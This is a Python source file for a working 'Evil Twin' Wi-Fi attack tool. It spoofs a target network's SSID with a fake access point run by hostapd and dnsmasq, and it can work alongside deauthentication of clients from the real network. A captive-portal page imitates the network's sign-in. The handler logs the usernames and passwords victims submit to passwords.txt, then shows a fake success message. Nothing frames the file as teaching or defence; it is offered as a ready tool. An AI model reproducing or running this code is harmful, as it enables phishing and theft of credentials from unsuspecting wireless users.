#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from pathlib import Path

# Global variables
http_server = None
server_thread = None
running = False
target_ssid = None
cleanup_done = False
server_started = False  # Track if server successfully started
deauth_interface = None  # Interface to use for deauth attacks

# HTTP Handler Class
class CaptivePortalHandler(BaseHTTPRequestHandler):
    """HTTP handler for captive portal"""
    
    def log_message(self, format, *args):
        """Suppress HTTP server logs"""
        pass
    
    def do_GET(self):
        """Serve the login page"""
        portal_html_path = "captive_portal/portal/index.html"
        
        if os.path.exists(portal_html_path):
            with open(portal_html_path, 'r') as f:
                html = f.read()
            html = html.replace('{{SSID}}', target_ssid)
        else:
            html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>{target_ssid} - Login</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background: #f0f0f0;
                    }}
                    .login-container {{
                        background: white;
                        padding: 40px;
                        border-radius: 10px;
                        box-shadow: 0 0 20px rgba(0,0,0,0.1);
                        width: 350px;
                    }}
                    h2 {{
                        text-align: center;
                        color: #333;
                        margin-bottom: 30px;
                    }}
                    input {{
                        width: 100%;
                        padding: 12px;
                        margin: 10px 0;
                        border: 1px solid #ddd;
                        border-radius: 5px;
                        box-sizing: border-box;
                        font-size: 14px;
                    }}
                    button {{
                        width: 100%;
                        padding: 12px;
                        background: #4CAF50;
                        color: white;
                        border: none;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 16px;
                        margin-top: 20px;
                    }}
                    button:hover {{
                        background: #45a049;
                    }}
                </style>
            </head>
            <body>
                <div class="login-container">
                    <h2>{target_ssid}</h2>
                    <p style="text-align: center; color: #666;">Please sign in to continue</p>
                    <form method="POST" action="/login">
                        <input type="text" name="username" placeholder="Username or Email" required autofocus>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Sign In</button>
                    </form>
                </div>
            </body>
            </html>
            """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def do_POST(self):
        """Capture credentials from POST request"""
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = parse_qs(post_data)
            
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            
            if username and password:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                client_ip = self.client_address[0]
                
                log_entry = f"[{timestamp}] SSID: {target_ssid} | IP: {client_ip} | Username: {username} | Password: {password}\n"
                
                with open('passwords.txt', 'a') as f:
                    f.write(log_entry)
                
                print(f"\n[CAPTURED CREDENTIALS]")
                print(f"  SSID: {target_ssid}")
                print(f"  Username: {username}")
                print(f"  Password: {password}")
                print(f"  From IP: {client_ip}")
                print("")
            
            response = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Connected</title>
                <meta http-equiv="refresh" content="3;url=/">
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background: #f0f0f0;
                    }}
                    .message {{
                        text-align: center;
                        padding: 40px;
                        background: white;
                        border-radius: 10px;
                        box-shadow: 0 0 20px rgba(0,0,0,0.1);
                    }}
                    h2 {{ color: #4CAF50; }}
                </style>
            </head>
            <body>
                <div class="message">
                    <h2>✓ Authentication Successful</h2>
                    <p>You are now connected to {target_ssid}</p>
                    <p style="color: #666;">Redirecting...</p>
                </div>
            </body>
            </html>
            """
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(response.encode())

def check_requirements():
    """Check if required files and tools exist"""
    scripts = ['captive_portal/setup_ap.sh', 'captive_portal/teardown_ap.sh']
    for script in scripts:
        if not os.path.exists(script):
            print(f"[ERROR] Missing script: {script}")
            return False
        os.chmod(script, 0o755)
    
    tools = ['hostapd', 'dnsmasq', 'iptables']
    for tool in tools:
        result = subprocess.run(['which', tool], capture_output=True)
        if result.returncode != 0:
            print(f"[ERROR] Missing tool: {tool}")
            print(f"Install with: sudo apt-get install {tool}")
            return False
    
    Path('passwords.txt').touch()
    return True

def start_web_server():
    """Start the captive portal web server"""
    global http_server, server_thread, running, server_started
    
    def run_server():
        global http_server, server_started
        try:
            # Kill any existing process on port 80 first
            subprocess.run(['sudo', 'fuser', '-k', '80/tcp'], 
                         stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            time.sleep(0.5)
            
            # Check if the cleanup flag is already set (race condition prevention)
            if cleanup_done:
                print("[WARNING] Cleanup already started, not starting web server")
                return
            
            # Bind to 10.0.0.1:80
            http_server = HTTPServer(('10.0.0.1', 80), CaptivePortalHandler)
            server_started = True
            print("[✓] Captive portal web server started on 10.0.0.1:80")
            
            while running and not cleanup_done:
                http_server.handle_request()
                
        except OSError as e:
            server_started = False
            if 'Address already in use' in str(e):
                print("[ERROR] Port 80 is already in use")
                print("[TIP] Try: sudo fuser -k 80/tcp")
            elif 'Cannot assign requested address' in str(e):
                print("[ERROR] IP 10.0.0.1 not yet configured")
            else:
                print(f"[ERROR] Web server error: {e}")
        except Exception as e:
            server_started = False
            if running and not cleanup_done:
                print(f"[ERROR] Web server error: {e}")
    
    print("[*] Starting captive portal web server...")
    running = True
    server_started = False
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    # Wait for server to start (with timeout)
    for _ in range(10):  # Try for 5 seconds
        if server_started:
            return True
        time.sleep(0.5)
    
    return server_started

def stop_web_server():
    """Stop the web server"""
    global running, http_server, server_started
    
    running = False
    server_started = False
    
    if http_server:
        try:
            http_server.shutdown()
        except:
            pass
    
    # Kill any process on port 80
    subprocess.run(['sudo', 'fuser', '-k', '80/tcp'], 
                  stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

def disable_monitor_on_ap_interface():
    """Disable monitor mode on wlan0 if it's in monitor mode"""
    try:
        # Check if wlan0 is in monitor mode
        result = subprocess.run(['iwconfig', 'wlan0'], 
                              capture_output=True, text=True)
        if 'Monitor' in result.stdout:
            print("[*] Disabling monitor mode on wlan0...")
            subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'down'], 
                         stderr=subprocess.DEVNULL)
            subprocess.run(['sudo', 'iw', 'dev', 'wlan0', 'set', 'type', 'managed'], 
                         stderr=subprocess.DEVNULL)
            subprocess.run(['sudo', 'ip', 'link', 'set', 'wlan0', 'up'], 
                         stderr=subprocess.DEVNULL)
            time.sleep(1)
    except:
        pass

def run_setup_script(ssid, channel):
    """Run the bash setup script for AP"""
    ap_interface = "wlan0"  # AP ALWAYS runs on wlan0
    
    # First, ensure wlan0 is not in monitor mode
    disable_monitor_on_ap_interface()
    
    # Stop channel hopping on any interface
    print("[*] Stopping channel hopping...")
    subprocess.run(['sudo', 'pkill', '-f', 'iwconfig.*channel'], stderr=subprocess.DEVNULL)
    time.sleep(0.5)
    
    print(f"[*] Setting up fake AP on {ap_interface} (built-in NIC)...")
    setup_script = "captive_portal/setup_ap.sh"
    
    # Run setup script
    result = subprocess.run(
        ['sudo', 'bash', setup_script, ap_interface, ssid, str(channel)],
        capture_output=False
    )
    
    # Give AP time to initialize
    time.sleep(3)
    
    # Verify AP is running
    hostapd_check = subprocess.run(['pgrep', 'hostapd'], capture_output=True)
    dnsmasq_check = subprocess.run(['pgrep', 'dnsmasq'], capture_output=True)
    
    if hostapd_check.returncode != 0 or dnsmasq_check.returncode != 0:
        print("\n[ERROR] Failed to start access point services")
        if hostapd_check.returncode != 0:
            print("  - hostapd is not running")
        if dnsmasq_check.returncode != 0:
            print("  - dnsmasq is not running")
        return False
    
    return True

def teardown_evil_twin():
    """Stop Evil Twin and restore system"""
    global cleanup_done, running, server_started
    
    if cleanup_done:
        return
    
    cleanup_done = True
    running = False
    server_started = False
    
    print("\n[*] Cleaning up and restoring system...")
    
    # Stop web server first
    try:
        stop_web_server()
    except:
        pass
    
    # Run teardown script with AP interface specified
    teardown_script = "captive_portal/teardown_ap.sh"
    ap_interface = "wlan0"
    
    if os.path.exists(teardown_script):
        print("[*] Running system restore script...")
        subprocess.run(['sudo', 'bash', teardown_script, ap_interface])
    else:
        print("[WARNING] Teardown script not found, doing basic cleanup...")
        subprocess.run(['sudo', 'killall', 'hostapd'], stderr=subprocess.DEVNULL)
        subprocess.run(['sudo', 'killall', 'dnsmasq'], stderr=subprocess.DEVNULL)
        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'])
    
    print("[✓] System restored to normal")

def setup_evil_twin(ssid, channel):
    """Setup Evil Twin with fake AP and captive portal
    
    Args:
        ssid: Target SSID to spoof
        channel: Channel to operate on
        deauth_iface: Interface to use for deauth (optional)
    
    Note: AP always runs on wlan0
    """
    global target_ssid, cleanup_done, running, deauth_interface
    
    cleanup_done = False
    target_ssid = ssid
    
    # AP always runs on wlan0
    ap_interface = "wlan0"
    
    try:
        print(f"\n{'='*60}")
        print(f"    EVIL TWIN ATTACK - {ssid}")
        print(f"{'='*60}\n")
        
        if not check_requirements():
            return False
        
        print(f"[*] AP Interface: {ap_interface} (built-in NIC)")
        
        # Check if we have a deauth interface set
        if deauth_interface:
            print(f"[*] Deauth Interface: {deauth_interface}")
            
            if deauth_interface == ap_interface or deauth_interface == "wlan0mon":
                print("\n[WARNING] Deauth interface conflicts with AP interface!")
                print("[!] Deauth attacks will be limited during Evil Twin operation.")
                print("[!] For best results, use a USB adapter for deauth.\n")
        else:
            print("[*] Deauth Interface: None (deauth disabled)")
        
        # Setup AP (always on wlan0)
        if not run_setup_script(ssid, channel):
            print("[ERROR] Failed to setup access point")
            return False
        
        # Then start web server
        if not start_web_server():
            print("[ERROR] Failed to start web server")
            return False
        
        print(f"\n{'='*60}")
        print(f"[✓] Evil Twin '{ssid}' is active on wlan0!")
        print(f"[✓] Captive portal ready on 10.0.0.1")
        print(f"[*] Waiting for victims to connect...")
        print(f"[*] Credentials will be saved to: passwords.txt")
        print(f"{'='*60}\n")
        
        return True
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return False
        
    except Exception as e:
        print(f"\n[ERROR] Unexpected error: {e}")
        return False
        
    finally:
        if not cleanup_done and not running:
            teardown_evil_twin()

def stop_evil_twin():
    """Wrapper function to stop Evil Twin"""
    teardown_evil_twin()

def is_running():
    """Check if Evil Twin is running"""
    return running and server_started

def quick_start(ssid, channel):
    """Quick start function for main script integration"""
    success = False
    try:
        success = setup_evil_twin(ssid, channel)
        return success
    finally:
        if not success and not cleanup_done:
            teardown_evil_twin()

def ensure_cleanup():
    """Ensure cleanup happens when module is unloaded or script exits"""
    global running
    if running:
        teardown_evil_twin()

# Register cleanup when module is imported
import atexit
atexit.register(ensure_cleanup)
